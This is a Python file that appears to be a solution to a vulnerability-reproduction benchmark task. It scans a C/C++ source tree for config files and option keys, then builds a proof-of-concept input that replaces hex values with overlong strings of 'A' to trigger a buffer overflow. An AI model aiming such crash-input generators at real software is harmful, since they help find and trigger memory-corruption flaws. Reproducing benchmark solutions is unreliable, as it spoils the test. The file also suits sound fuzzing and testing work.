import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        config_files, code_files = self._read_source_files(src_path)

        poc_str = None

        if config_files:
            # Prioritize config files that look like examples or real config files
            config_files = sorted(config_files, key=lambda pair: self._config_priority(pair[0]))
            poc_str = self._build_poc_from_config_files(config_files)

        if not poc_str:
            keys = self._extract_candidate_keys(code_files)
            if keys:
                poc_str = self._build_poc_from_keys(keys)

        if not poc_str:
            poc_str = self._fallback_poc_str()

        return poc_str.encode("ascii", errors="replace")

    # ---------------- Internal helpers ----------------

    def _read_source_files(self, src_path):
        config_files = []
        code_files = []

        def process_file(filename: str, data: bytes):
            base = os.path.basename(filename)
            is_code = self._is_code_file(base)
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")

            if is_code:
                code_files.append((filename, text))

            if self._is_config_like_file(base) or ("conf" in filename.lower() and not is_code):
                config_files.append((filename, text))

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for name in files:
                    path = os.path.join(root, name)
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    # Limit per-file size to 1MB for efficiency
                    if len(data) > 1024 * 1024:
                        continue
                    process_file(path, data)
        else:
            # Try to open as tarball
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for member in tf.getmembers():
                        if not member.isfile():
                            continue
                        if member.size > 1024 * 1024:
                            continue
                        try:
                            f = tf.extractfile(member)
                        except Exception:
                            continue
                        if f is None:
                            continue
                        try:
                            data = f.read()
                        finally:
                            f.close()
                        process_file(member.name, data)
            except tarfile.ReadError:
                # Fallback: treat as a single regular file
                try:
                    with open(src_path, "rb") as f:
                        data = f.read()
                    process_file(src_path, data)
                except OSError:
                    pass

        return config_files, code_files

    def _is_code_file(self, basename: str) -> bool:
        ext = os.path.splitext(basename.lower())[1]
        return ext in (
            ".c",
            ".h",
            ".cpp",
            ".cxx",
            ".cc",
            ".hpp",
            ".hh",
            ".hxx",
        )

    def _is_config_like_file(self, basename: str) -> bool:
        name = basename.lower()
        root, ext = os.path.splitext(name)
        if ext in (
            ".conf",
            ".cfg",
            ".cnf",
            ".ini",
            ".config",
            ".txt",
            ".sample",
            ".example",
            ".in",
        ):
            return True
        if name.startswith("readme"):
            return True
        if "conf" in name or "config" in name:
            return True
        return False

    def _config_priority(self, filename: str) -> int:
        full = filename.lower()
        base = os.path.basename(full)
        score = 0
        if "example" in full or "sample" in full:
            score -= 2
        if base.endswith((".conf", ".cfg", ".cnf", ".ini", ".config")):
            score -= 1
        if "doc" in full or "readme" in base:
            score += 1
        if "test" in full:
            score += 1
        return score

    def _build_poc_from_config_files(self, config_files):
        mutated_texts = []
        # Use up to 10 config-like files that actually contain hex patterns
        for fname, text in config_files:
            mutated = self._mutate_config_text(text, target_hex_len=1024)
            if mutated:
                mutated_texts.append(mutated)
                if len(mutated_texts) >= 10:
                    break
        if mutated_texts:
            return "\n".join(mutated_texts)
        return None

    def _mutate_config_text(self, text: str, target_hex_len: int = 1024):
        lines = text.splitlines()
        out_lines = []
        mutated_flag = False

        for orig_line in lines:
            # Keep original indentation
            stripped_leading = orig_line.lstrip(" \t")
            indent_len = len(orig_line) - len(stripped_leading)
            indent = orig_line[:indent_len]
            working = stripped_leading

            # Remove leading comment markers for lines we will mutate
            if working.startswith("#"):
                working_inner = working[1:].lstrip(" \t")
            elif working.startswith(";"):
                working_inner = working[1:].lstrip(" \t")
            elif working.startswith("//"):
                working_inner = working[2:].lstrip(" \t")
            else:
                working_inner = working

            mutated = self._enlarge_hex_in_line(working_inner, target_hex_len)
            if mutated is not None:
                mutated_flag = True
                out_lines.append(indent + mutated)
            else:
                out_lines.append(orig_line)

        if mutated_flag:
            return "\n".join(out_lines) + "\n"
        return None

    def _enlarge_hex_in_line(self, line: str, target_hex_len: int):
        # Try patterns in order of likelihood; return modified line or None
        # 1. 0x-prefixed hex literal
        m = re.search(r"0x[0-9A-Fa-f]+", line)
        if m:
            prefix = line[: m.start()]
            suffix = line[m.end() :]
            new_hex = "0x" + "A" * target_hex_len
            return prefix + new_hex + suffix

        # 2. hex=<hex> or hex: <hex>
        m2 = re.search(r"(hex\s*[:=]\s*)([0-9A-Fa-f]+)", line, re.IGNORECASE)
        if m2:
            prefix = line[: m2.start(2)]
            suffix = line[m2.end(2) :]
            new_val = "A" * target_hex_len
            return prefix + new_val + suffix

        # 3. hex="deadbeef" style
        m3 = re.search(r'(hex\s*[:=]\s*["\'])([0-9A-Fa-f]+)(["\'])', line, re.IGNORECASE)
        if m3:
            prefix = line[: m3.start(2)]
            suffix = line[m3.end(2) :]
            new_val = "A" * target_hex_len
            return prefix + new_val + suffix

        # 4. generic quoted long hex-ish string
        m4 = re.search(r'(["\'])([0-9A-Fa-f]{8,})(["\'])', line)
        if m4:
            prefix = line[: m4.start(2)]
            suffix = line[m4.end(2) :]
            new_val = "A" * target_hex_len
            return prefix + new_val + suffix

        # 5. bare long hex-ish token
        m5 = re.search(r"\b[0-9A-Fa-f]{8,}\b", line)
        if m5:
            prefix = line[: m5.start()]
            suffix = line[m5.end() :]
            new_val = "A" * target_hex_len
            return prefix + new_val + suffix

        return None

    def _extract_candidate_keys(self, code_files, max_keys: int = 200):
        hex_related = set()
        other = set()

        pattern_strcmp1 = re.compile(r'str(?:case)?cmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*\)')
        pattern_strcmp2 = re.compile(r'str(?:case)?cmp\s*\(\s*"([^"]+)"\s*,\s*[^)]+\)')
        pattern_strncmp1 = re.compile(r'strn(?:case)?cmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*,\s*[0-9]+\s*\)')
        pattern_strncmp2 = re.compile(r'strn(?:case)?cmp\s*\(\s*"([^"]+)"\s*,\s*[^,]+,\s*[0-9]+\s*\)')
        pattern_array = re.compile(r'\{\s*"([^"]+)"\s*,')  # e.g., option arrays

        for fname, text in code_files:
            lower = text.lower()
            has_hex = (
                "0x" in text
                or "isxdigit" in text
                or "strtoul" in text
                or "strtol" in text
                or "%x" in text
                or "%X" in text
                or "hex" in lower
            )
            dest_set = hex_related if has_hex else other

            for pat in (pattern_strcmp1, pattern_strcmp2, pattern_strncmp1, pattern_strncmp2):
                for m in pat.finditer(text):
                    key = m.group(1)
                    kf = self._filter_key(key)
                    if kf:
                        dest_set.add(kf)

            for m in pattern_array.finditer(text):
                key2 = m.group(1)
                kf2 = self._filter_key(key2)
                if kf2:
                    dest_set.add(kf2)

        ordered_keys = sorted(hex_related)
        if len(ordered_keys) < max_keys:
            # Fill with other keys if needed
            remaining = max_keys - len(ordered_keys)
            ordered_keys.extend(sorted(other)[:remaining])

        return ordered_keys[:max_keys]

    def _filter_key(self, s: str):
        if not s:
            return None
        if any(ch.isspace() for ch in s):
            return None
        allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-."
        for ch in s:
            if ch not in allowed:
                return None
        return s

    def _build_poc_from_keys(self, keys):
        if not keys:
            return self._fallback_poc_str()

        max_total_bytes = 200000  # rough target for size
        per_val = max(64, min(2048, max_total_bytes // (max(1, len(keys)) * 3)))

        lines = []
        hex_chunk = "A" * per_val
        for key in keys:
            lines.append(f"{key}=0x{hex_chunk}")
            lines.append(f"{key} 0x{hex_chunk}")
            lines.append(f"{key}={hex_chunk}")

        return "\n".join(lines) + "\n"

    def _fallback_poc_str(self):
        target = 2048
        hex_str = "A" * target
        common_keys = [
            "key",
            "secret",
            "hex",
            "id",
            "address",
            "mac",
            "token",
            "hash",
            "guid",
            "seed",
            "serial",
        ]
        lines = []
        for key in common_keys:
            lines.append(f"{key}=0x{hex_str}")
            lines.append(f"{key} 0x{hex_str}")
            lines.append(f"{key}={hex_str}")
        lines.append(f"0x{hex_str}")
        return "\n".join(lines) + "\n"
